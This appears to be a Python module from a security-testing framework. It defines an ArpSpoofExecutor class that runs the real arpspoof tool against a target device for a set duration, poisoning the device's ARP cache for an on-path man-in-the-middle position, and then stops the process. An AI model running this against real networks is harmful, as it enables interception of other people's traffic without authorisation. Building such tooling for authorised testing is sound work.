from __future__ import annotations

import subprocess
import time

from typing import TYPE_CHECKING

from capex.exceptions import AttackExecutionError

if TYPE_CHECKING:
    from capex.models import ArpSpoofAttackConfig, DeviceConfig
    from capex.runner import CommandRunner

_START_CHECK_DELAY_SECONDS = 0.3
_STOP_TIMEOUT_SECONDS = 10
_KILL_TIMEOUT_SECONDS = 5


class ArpSpoofExecutor:
    """Runs real arpspoof against a device for a bounded duration, then stops it.

    Poisons the device's ARP cache for its relationship with gateway_ip
    (classic on-path MITM), mirroring TcpdumpCapture's popen/terminate/kill
    start-stop pattern since arpspoof itself runs until killed.
    """

    def __init__(self, *, runner: CommandRunner, attack: ArpSpoofAttackConfig) -> None:
        self._runner = runner
        self._attack = attack

    def execute(self, *, device: DeviceConfig) -> str | None:
        process = self._runner.popen([
            self._attack.arpspoof_binary,
            '-i',
            self._attack.interface,
            '-t',
            str(device.ip),
            self._attack.gateway_ip,
        ])

        time.sleep(_START_CHECK_DELAY_SECONDS)

        if process.poll() is not None:
            _, stderr = process.communicate()
            msg = f'{self._attack.arpspoof_binary} exited immediately with code {process.returncode}: {stderr.strip()}'
            raise AttackExecutionError(msg)

        time.sleep(self._attack.duration_seconds)

        process.terminate()
        try:
            process.wait(timeout=_STOP_TIMEOUT_SECONDS)
        except subprocess.TimeoutExpired:
            process.kill()
            process.wait(timeout=_KILL_TIMEOUT_SECONDS)

        return f'duration_seconds={self._attack.duration_seconds}'
